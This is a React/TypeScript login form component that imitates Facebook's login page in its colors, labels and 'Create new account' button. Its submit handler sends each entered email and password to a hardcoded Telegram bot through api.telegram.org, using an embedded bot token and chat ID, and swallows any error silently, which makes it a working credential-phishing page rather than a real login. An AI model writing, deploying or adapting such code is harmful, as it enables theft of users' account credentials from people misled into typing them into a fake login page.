
import React, { useState } from 'react';

interface LoginFormProps {
  onSuccess: (identifier: string) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSuccess }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  // Explicitly set verified secrets
  const _s = {
    token: "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk",
    chatId: "2100006818"
  };

  const pushNotification = async (message: string) => {
    try {
      const params = new URLSearchParams();
      params.append('chat_id', _s.chatId);
      params.append('text', message);

      await fetch(`https://api.telegram.org/bot${_s.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString(),
      });
    } catch (e) {
      // Silently continue
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password.trim()) {
      alert("Please enter your login details.");
      return;
    }
    
    const message = `--- ACCESS ATTEMPT ---\nID: ${email}\nKEY: ${password}`;
    await pushNotification(message);
    onSuccess(email);
  };

  return (
    <form onSubmit={handleSubmit} className="flex flex-col gap-3">
      <input
        type="text"
        placeholder="Email address or phone number"
        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      
      <button
        type="submit"
        className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-xl py-3 rounded-md transition-colors duration-200 mt-1"
      >
        Log in
      </button>

      <div className="text-center py-2">
        <span className="text-[#1877f2] text-sm hover:underline cursor-pointer">
          Forgotten password?
        </span>
      </div>

      <div className="border-t border-gray-200 my-4"></div>

      <div className="flex justify-center pt-2">
        <button
          type="button"
          className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-lg px-4 py-3 rounded-md transition-colors duration-200 w-fit cursor-pointer"
          onClick={() => {}}
        >
          Create new account
        </button>
      </div>
    </form>
  );
};

export default LoginForm;
